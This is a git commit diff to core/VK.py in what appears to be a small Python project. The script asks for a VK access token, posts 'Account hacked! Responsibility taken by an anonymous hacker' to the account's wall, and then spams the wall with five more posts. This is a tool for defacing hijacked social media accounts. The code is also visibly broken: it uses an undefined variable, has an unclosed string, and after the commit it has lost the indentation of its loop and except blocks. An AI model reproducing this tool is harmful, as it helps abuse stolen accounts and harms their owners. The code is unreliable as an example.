582eaaacc3d88b341949b783c9948d132ea846ba
pkgsearch <73498800+pkgsearch@users.noreply.github.com>
2021-01-05 12:37:49 +0300

    Update VK.py

--- core/VK.py
+++ core/VK.py
@@ -14,17 +14,18 @@ print("""
   ▒██▒  █  █▓         █    █ ▒████▒ █  ▓▒█
    ██   █   █░        █   ▒█ ▓▒  ▒▓ █  ░██
    ██   █   ▒█        █████░ █░  ░█ █   ██
- made by pkgsearch""")
-            huy = input("Вводи токен") 
-            token = vk_api.VkApi(token = tok) 
-            vk = token.get_api()
-            vk.wall.post(message=Аккаунт  взломан! Ответственность взял анонимный хакер')
-            for var in range(5):
-                time.sleep(3)
-                vk.wall.post(message='vto.pe')             
-                print("[log] Сообщение отправленно. Ожидайте бана!")
-            os.system("clear")
-        except Exception as er:
-            print('Невалидный токен или страница в бане')
+ made by pkgsearch
+""")
+huy = input("Вводи токен") 
+token = vk_api.VkApi(token = tok) 
+vk = token.get_api()
+vk.wall.post(message=Аккаунт  взломан! Ответственность взял анонимный хакер')
+for var in range(5):
+time.sleep(3)
+vk.wall.post(message='vto.pe')             
+print("[log] Сообщение отправленно. Ожидайте бана!")
+os.system("clear")
+except Exception as er:
+print('Невалидный токен или страница в бане')
            
     
